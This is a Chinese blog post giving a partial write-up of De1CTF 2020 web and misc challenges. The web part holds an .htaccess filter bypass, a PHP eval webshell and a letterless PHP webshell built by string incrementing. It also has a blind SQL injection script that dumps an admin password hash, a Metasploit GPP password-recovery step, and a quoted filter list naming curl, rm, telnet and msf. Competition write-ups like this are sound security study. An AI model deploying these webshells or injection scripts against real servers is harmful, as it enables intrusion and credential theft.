<!DOCTYPE html>
<html lang="zh-CN">










<head><meta name="generator" content="Hexo 3.8.0">
    <meta charset="utf-8">
    <link rel="apple-touch-icon" sizes="76x76" href="/apple-touch-icon.png">
    <link rel="icon" type="image/png" href="/favicon.png">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta http-equiv="x-ua-compatible" content="ie=edge">
    <meta name="description" content="">
    <meta name="author" content="chuddy">
    <meta name="keywords" content="">
    <title>De1CTF2020部分writeup ~ chuddy&#39;s Blog</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.7.2/css/all.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/css/mdb.min.css">
    <link rel="stylesheet" href="/css/style.css">
    <link rel="stylesheet" href="https://at.alicdn.com/t/font_1067060_vr10bjtg3us.css">
    
        <link rel="stylesheet" href="/css/Prettify/tomorrow-night-eighties.min.css">
    
</head>

<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
<div class="container">
    <a class="navbar-brand" href="/"><strong>chuddy&#39;s Blog</strong></a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
        <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
        <ul class="navbar-nav ml-auto text-center">
            
            <li class="nav-item">
                <a class="nav-link" href="/">Home</a>
            </li>
            
            <li class="nav-item">
                <a class="nav-link" href="/archives/">Archives</a>
            </li>
            
        </ul>
    </div>
</div>


</nav>
    <div class="view intro-2" style='background: url("/post.jpg")no-repeat center center;background-size: cover;'>
    <div class="full-bg-img">
        <div class="mask rgba-black-light flex-center">
        <div class="container text-center white-text wow fadeInUp">
            <p class="h2">De1CTF2020部分writeup</p>
            <br>
            
            <p>Monday, May 4th 2020, 7:43 am</p>
            
        </div>
        </div>
    </div>
    </div>
  </header>

  <main>
  
  <div class="container-fluid">
    <div class="row">
        <div class="col-md-8 offset-md-2 ">
            <div class="post-content py-5 z-depth-3 main">
                <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>XCTF分站赛的第一站De1CTF开始了。。。。<br>这次web题目质量很好  可是太菜了，没做出来多少</p>
<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="check-in"><a href="#check-in" class="headerlink" title="check in"></a>check in</h2><p>打开链接发现是一个文件上传的题目</p>
<p><img src="https://s1.ax1x.com/2020/05/04/Y99NMd.png" alt="Y99NMd.png"><br>测试发现这里对文件的后罪名有限制，可以修改<code>Content-Type:</code>参数进行绕过，但是上传<code>php</code>文件不行。。。</p>
<p>对文件内容也有限制。。</p>
<pre><code> perl|pyth|ph|auto|curl|base|&gt;|rm|ruby|openssl|war|lua|msf|xter|telnet in contents! 
</code></pre><p>过滤了一些关键的字符。。<br>看到这里猜测考点是利用<code>.htaccess getshell</code></p>
<p>正常的一个<code>.htaccess</code>的内容为：</p>
<pre><code>SetHandler application/x-httpd-php
</code></pre><p>但是因为文本中有<code>ph</code>字符，需要想办法进行绕过，在测试发现：</p>
<pre><code>SetHandler application/x-httpd-p\
hp
</code></pre><p>换行进行绕过是可以的。。<br><img src="https://s1.ax1x.com/2020/05/04/Y99LLR.png" alt="Y99LLR.png"></p>
<p>然后上传图片马，访问即可。。</p>
<p>由于过滤了<code>ph</code>,<code>&gt;</code>等字符，，所以图片马的内容为：</p>
<pre><code>&lt;?=@eval($_POST[aa]);
</code></pre><p><img src="https://s1.ax1x.com/2020/05/04/Y9CpWD.png" alt="Y9CpWD.png"></p>
<p>用蚁剑进行链接：</p>
<p>在根目录找到了flag…<br><img src="https://s1.ax1x.com/2020/05/04/Y9CQyj.png" alt="Y9CQyj.png"></p>
<h2 id="Hard-Pentest-1"><a href="#Hard-Pentest-1" class="headerlink" title="Hard_Pentest_1"></a>Hard_Pentest_1</h2><p>打开题目发现给出了源码</p>
<pre><code>&lt;?php
//Clear the uploads directory every hour
highlight_file(__FILE__);
$sandbox = &quot;uploads/&quot;. md5(&quot;De1CTF2020&quot;.$_SERVER[&#39;REMOTE_ADDR&#39;]);
@mkdir($sandbox);
@chdir($sandbox);

if($_POST[&quot;submit&quot;]){
    if (($_FILES[&quot;file&quot;][&quot;size&quot;] &lt; 2048) &amp;&amp; Check()){
        if ($_FILES[&quot;file&quot;][&quot;error&quot;] &gt; 0){
            die($_FILES[&quot;file&quot;][&quot;error&quot;]);
        }
        else{
            $filename=md5($_SERVER[&#39;REMOTE_ADDR&#39;]).&quot;_&quot;.$_FILES[&quot;file&quot;][&quot;name&quot;];
            move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;], $filename);
            echo &quot;save in:&quot; . $sandbox.&quot;/&quot; . $filename;
        }
    }
    else{
        echo &quot;Not Allow!&quot;;
    }
}

function Check(){
    $BlackExts = array(&quot;php&quot;);
    $ext = explode(&quot;.&quot;, $_FILES[&quot;file&quot;][&quot;name&quot;]);
    $exts = trim(end($ext));
    $file_content = file_get_contents($_FILES[&quot;file&quot;][&quot;tmp_name&quot;]);

    if(!preg_match(&#39;/[a-z0-9;~^`&amp;|]/is&#39;,$file_content)  &amp;&amp; 
        !in_array($exts, $BlackExts) &amp;&amp; 
        !preg_match(&#39;/\.\./&#39;,$_FILES[&quot;file&quot;][&quot;name&quot;])) {
          return true;
    }
    return false;
}
?&gt;

&lt;html&gt;
&lt;head&gt;
&lt;meta charset=&quot;utf-8&quot;&gt;
&lt;title&gt;upload&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;

&lt;form action=&quot;index.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;
    &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;&lt;br&gt;
    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;submit&quot;&gt;
&lt;/form&gt;

&lt;/body&gt;
&lt;/html&gt;
</code></pre><p>主要看一下这个<code>check()</code></p>
<pre><code>function Check(){
    $BlackExts = array(&quot;php&quot;);
    $ext = explode(&quot;.&quot;, $_FILES[&quot;file&quot;][&quot;name&quot;]);
    $exts = trim(end($ext));
    $file_content = file_get_contents($_FILES[&quot;file&quot;][&quot;tmp_name&quot;]);

    if(!preg_match(&#39;/[a-z0-9;~^`&amp;|]/is&#39;,$file_content)  &amp;&amp; 
        !in_array($exts, $BlackExts) &amp;&amp; 
        !preg_match(&#39;/\.\./&#39;,$_FILES[&quot;file&quot;][&quot;name&quot;])) {
          return true;
    }
    return false;
}
</code></pre><p>限制了后缀名，不能为<code>php</code>，我们可以大小写进行绕过</p>
<p>最重要的是对文件内容进行了过滤。。。</p>
<pre><code>preg_match(&#39;/[a-z0-9;~^`&amp;|]/is&#39;,$file_content)
</code></pre><p>不能出现字母数字和一些特殊字符。。<br>想到了无字母数字getshell的点，因为过滤了<code>~^</code>,就不能用取反和异或来进行getshell。想到的方法是递增。。。但是递增需要分号，需要绕过分号，来进行getshell…</p>
<p>测试发现可以利用<code>&lt;?=?&gt;</code>来进行绕过</p>
<pre><code>&lt;?=$_=[]?&gt;
&lt;?=$_=&quot;$_&quot;?&gt;
&lt;?=$_=$_[&#39;!&#39;==&#39;@&#39;]?&gt;
</code></pre><p>刚开始传的是<code>assert</code>的木马，发现怎么也执行不了命令，忽然看到php版本为<code>PHP/7.2.29</code>  那就打扰了</p>
<p>后来改变目标传一个<code>system</code>的，发现可以成功。。。</p>
<p>递增的代码  相当于<code>system($_POST[_]);</code>：</p>
<pre><code>&lt;?=$_=[]?&gt;
&lt;?=$_=&quot;$_&quot;?&gt;
&lt;?=$_=$_[&#39;!&#39;==&#39;@&#39;]?&gt;
&lt;?=$___=$_?&gt;
&lt;?=$__=$_?&gt;
&lt;?=$__++?&gt;&lt;?=$__++?&gt;
&lt;?=$__++?&gt;&lt;?=$__++?&gt;
&lt;?=$____=$__++?&gt;
&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$_____________=$__++?&gt;&lt;?=$__++?&gt;
&lt;?=$__________=$__++?&gt;
&lt;?=$_________=$__++?&gt;
&lt;?=$__++?&gt;
&lt;?=$________=$__++?&gt;
&lt;?=$_____=$__++?&gt;
&lt;?=$______=$__++?&gt;
&lt;?=$______?&gt;
&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;
&lt;?=$____________=$__++?&gt;
&lt;?=$_____.$____________.$_____.$______.$____.$_____________?&gt;
&lt;?=$________________=$_____.$____________.$_____.$______.$____.$_____________?&gt;
&lt;?=$_________.$__________.$_____.$______?&gt;
&lt;?=($________________)(${&#39;_&#39;.$_________.$__________.$_____.$______}[_])?&gt;
</code></pre><p><img src="https://s1.ax1x.com/2020/05/04/Y9ehjK.png" alt="Y9ehjK.png"></p>
<p>可以执行系统命令。。。</p>
<p>上传文件，打到msf上：<br><img src="https://s1.ax1x.com/2020/05/04/Y9mD2t.png" alt="Y9mD2t.png"></p>
<p>发现了一些信息，存在Hint<br><img src="https://s1.ax1x.com/2020/05/04/Y9mhPs.png" alt="Y9mhPs.png"></p>
<p>查看目录文件发现了压缩包 ：<br><img src="https://s1.ax1x.com/2020/05/04/Y9npM6.png" alt="Y9npM6.png"></p>
<p>将其下载下来，发现需要密码。。</p>
<p>查看了一下用户，发现了一个很奇怪的用户名。。<br><img src="https://s1.ax1x.com/2020/05/04/Y9nJWn.png" alt="Y9nJWn.png"><br>看一下这个用户的信息：<br><img src="https://s1.ax1x.com/2020/05/04/Y9n0wF.png" alt="Y9n0wF.png"><br>发现也没有什么有用的信息。。</p>
<p>然后有师傅说会不会<code>HintZip_Pass</code>用户的密码就是压缩包的密码。。。</p>
<p>由于对域渗透了解有限。。没有什么好的方法来得到用户密码。。</p>
<p>找到了这样的一篇文章[参考文章]<br>利用msf的<code>gpp</code>模块  成功获取到了用户的密码：<br>(<a href="https://blog.csdn.net/qq_36119192/article/details/104344105" target="_blank" rel="noopener">https://blog.csdn.net/qq_36119192/article/details/104344105</a>)</p>
<p><img src="https://s1.ax1x.com/2020/05/04/Y9n4Te.png" alt="Y9n4Te.png"></p>
<p>也有提示这就是压缩包的密码<code>zL1PpP@sSwO3d</code><br>解压得到flag..<br><img src="https://s1.ax1x.com/2020/05/04/Y9uCpn.png" alt="Y9uCpn.png"></p>
<h2 id="mixture"><a href="#mixture" class="headerlink" title="mixture"></a>mixture</h2><p>打开发现是个登陆页面：<br><img src="https://s1.ax1x.com/2020/05/04/Y9MHp9.png" alt="Y9MHp9.png"></p>
<p>随便输入就可以进去 很神奇<code>aa:aa</code><br>进入之后发现只能够查看用户信息<br><img src="https://s1.ax1x.com/2020/05/04/Y9QE0f.png" alt="Y9QE0f.png"></p>
<p><code>admin.php</code>和<code>select.php</code>都需要<code>admin</code>权限<br>查看源码发现有提示<code>orderby</code>：<br><img src="https://s1.ax1x.com/2020/05/04/Y9Q0j1.png" alt="Y9Q0j1.png"><br>猜测是一个注入。。<br>测试发现<code>http://134.175.185.244/member.php?orderby=|1=2</code>和<code>http://134.175.185.244/member.php?orderby=|1=1</code>回显不同，找到了注入点。。。。<br>发现过滤了一些东西：</p>
<pre><code>if
desc
sleep
updatexml
^
union
&amp;&amp;
regexp
exp
extractvalue
length
hex
</code></pre><p>可以进行布尔盲注。。<br>写个脚本开始跑。。</p>
<pre><code>import requests
import re


url=&quot;http://134.175.185.244/member.php?orderby=&quot;
cookies={&#39;PHPSESSID&#39;:&#39;s0d02a5rb52ejonbml114f8pen&#39;}
flag=&#39;&#39;
for i in range(1,33):
    print i
    for j in range(37,127):
        # payload=&quot;|1=(ascii(mid((database()),&quot;+str(i)+&quot;,1))=&#39;&quot;+str(j)+&quot;&#39;)&quot;
        # payload=&quot;|1=(ascii(mid(((SELECT group_concat(table_name) from information_schema.tables where table_schema=database())),&quot;+str(i)+&quot;,1))=&#39;&quot;+str(j)+&quot;&#39;)&quot;
        # payload=&quot;|1=(ascii(mid(((SELECT group_concat(column_name) from information_schema.columns where table_name=&#39;member&#39;)),&quot;+str(i)+&quot;,1))=&#39;&quot;+str(j)+&quot;&#39;)&quot;
        payload=&quot;|1=(ascii(mid(((select password from member where username=&#39;admin&#39;)),&quot;+str(i)+&quot;,1))=&#39;&quot;+str(j)+&quot;&#39;)&quot;
        url_1=url+payload
        res=requests.get(url_1,cookies=cookies)
        a = re.search(r&#39;&lt;td&gt;(.*)&lt;/td&gt;&#39;, res.text, re.M | re.S).group(1)[:1]
        if int(a)==2:
            flag+=chr(j)
            print flag
            break
        else:
            pass
# database test

# member,users

# member:  id,username,password
# password: 18a960a3a0b3554b314ebe77fe545c85
</code></pre><p>得到了密码的md5值，在网站进行解密得到密码。。<br><img src="https://s1.ax1x.com/2020/05/04/Y9a26O.png" alt="Y9a26O.png"></p>
<p>用<code>admin:goodlucktoyou</code>进行登陆：</p>
<p>发现select.php可以读源码。。。<br>发现存在<code>/readflag</code></p>
<p><img src="https://s1.ax1x.com/2020/05/04/Y9dX26.png" alt="Y9dX26.png"><br>说明需要执行命令来得到flag…</p>
<p><code>admin</code>页面是一个<code>phpinfo()</code>页面。。</p>
<p>发现了一个神奇的东西<code>Minclude</code><br><img src="https://s1.ax1x.com/2020/05/04/Y9wMIs.png" alt="Y9wMIs.png"></p>
<p><code>select.php</code>的内容为：</p>
<pre><code>&lt;?php
include &quot;profile.php&quot;;
$search = $_POST[&#39;search&#39;];

if($_SESSION[&#39;admin&#39;]==1){
    print &lt;&lt;&lt;EOT
&lt;form class=&quot;form&quot; action=&quot;select.php&quot; method=&quot;post&quot;&gt;
    &lt;div class=&quot;form-group&quot;&gt;
        &lt;label for=&quot;disabledTextInput&quot;&gt;You can search anything here!!&lt;/label&gt;&lt;/br&gt;
        &lt;input type=&quot;text&quot; name=&quot;search&quot; id=&quot;fromgo&quot; class=&quot;form-control&quot;&gt;
    &lt;/div&gt;
    &lt;/div&gt;
    &lt;div class=&quot;form-group&quot;&gt;
        &lt;input type=&quot;submit&quot; name=&quot;submit&quot; class=&quot;btn btn-info btn-md&quot; value=&quot;submit&quot;&gt;
    &lt;/div&gt;
&lt;/form&gt;
EOT;
}
else{
    print &lt;&lt;&lt;EOT
  &lt;div class=&quot;container&quot;&gt; 
      &lt;div class=&quot;row&quot;  &gt;            
              &lt;div class=&quot;col-md-10 col-md-offset-4&quot;&gt;             
                &lt;div class=&quot;input-group&quot; display：block;margin：0 auto;&gt;                                                       
                            &lt;button class=&quot;btn btn-info btn-search &quot; type=&quot;button&quot; &gt;You are not admin or not enough money!&lt;/button&gt;
                              &lt;/span&gt;

                &lt;/div&gt;&lt;!-- /input-group --&gt;              
              &lt;/div&gt;&lt;!-- /.col-lg-6 --&gt; 
      &lt;/div&gt;
  &lt;/div&gt;
EOT;
}
if($_SESSION[&#39;admin&#39;]==1&amp;&amp;!empty($search)){
    //var_dump(urldecode($search));
    Minclude(urldecode($search));
    //lookup($search);
}
</code></pre><p>这里利用了<code>Minclude(urldecode($search));</code> 漏洞点应该就在这里了，，，</p>
<p>然后就是自闭了  没找到解决的方法。。。我太菜了。。。</p>
<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="Welcome-to-the-2020-de1ctf"><a href="#Welcome-to-the-2020-de1ctf" class="headerlink" title="Welcome_to_the_2020_de1ctf"></a>Welcome_to_the_2020_de1ctf</h2><p>是一个加群链接</p>
<p>科学上网得到<code>flag</code><br><img src="https://s1.ax1x.com/2020/05/04/Y9w4JI.png" alt="Y9w4JI.png"></p>
<h2 id="Misc杂烩"><a href="#Misc杂烩" class="headerlink" title="Misc杂烩"></a>Misc杂烩</h2><p>是一个流量包：<br><img src="https://s1.ax1x.com/2020/05/04/Y90ThR.png" alt="Y90ThR.png"><br>发现里面有一张png图片，<br><img src="https://s1.ax1x.com/2020/05/04/Y96rAU.png" alt="Y96rAU.png"><br>将其分离出来，找到了一个链接：</p>
<p> <a href="https://drive.google.com/file/d/1JBdPj7eRaXuLCTFGn7AluAxmxQ4k1jvX/view" target="_blank" rel="noopener">https://drive.google.com/file/d/1JBdPj7eRaXuLCTFGn7AluAxmxQ4k1jvX/view</a></p>
<p>下载下来，得到了一个readme.zip<br>得到了一个docx文件<br><img src="https://s1.ax1x.com/2020/05/04/Y922cj.png" alt="Y922cj.png"><br>发现没什么东西</p>
<p>分离一下docx文件得到了<code>You_found_me_Orz.zip</code></p>
<p>根据赛题的提示</p>
<pre><code>In the burst test point of compressed packet password, the length of the password is 6, and the first two characters are &quot;D&quot; and &quot;E&quot;. 压缩包密码暴破考点中，密码的长度为6位，前两位为DE。
</code></pre><p>进行爆破</p>
<p>得到压缩包密码：<code>DE34Q1</code><br>得到了一个图片。<br>binwalk分离一下： 发现有一个压缩包，里面又文件666.jpg:fffffffflllll.txt 为flag<br><img src="https://s1.ax1x.com/2020/05/04/Y9WAWF.png" alt="Y9WAWF.png"><br>De1CTF{E4Sy_M1sc_By_Jaivy_31b229908cb9bb}</p>
<h2 id="Questionnaire"><a href="#Questionnaire" class="headerlink" title="Questionnaire"></a>Questionnaire</h2><p>问卷调查，直接给<code>flag</code><br><img src="https://s1.ax1x.com/2020/05/04/Y9WJQH.png" alt="Y9WJQH.png"></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这次比赛质量真的好，题目很好，也很新颖，接触了一些域渗透的东西，，<br>感觉有不错的收获。。</p>

                <hr>
                <div>
                    <p>
                         
                        <span class="badge badge-light">#&nbsp;writeup</span>
                        &nbsp;
                        
                    </p>
                </div>
                <br>
                
            </div>
        </div>
        <div class="d-none d-md-block col-md-2">
            
  <div id="toc" class="py-5">
    <p class="h6"><i class="iconfont icon-toc" style="vertical-align:middle"></i> Toc:</p> 
    <div id="tocbot"></div>
  </div>

        </div>
    </div>        
</div>

<br><br><br>

<!-- Comments -->
<div class="comments" id="comments">
 
</div>
  
  </main>

<footer class="mt-5">
  <div class="text-center py-3">
    <a href="https://hexo.io" target="_blank"><b>HEXO</b></a>
    <i class="iconfont icon-love"></i>
    <a href="https://github.com/0x2e/Material-T" target="_blank"> <b>Material-T</b></a>
  </div>
</footer>

  <!-- SCRIPTS -->
  <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/js/jquery-3.3.1.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/js/popper.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/js/bootstrap.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/js/mdb.min.js"></script>
  <script src="/js/main.js"></script>
  
    
      <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
    
    <script src="/js/post.js"></script>
    
      <script src="/js/plugins/prettify.js"></script>
      <script>
          $(document).ready(function(){
              $('pre').addClass('prettyprint linenums');
              prettyPrint();
          })
      </script>
    
  
</body>
</html>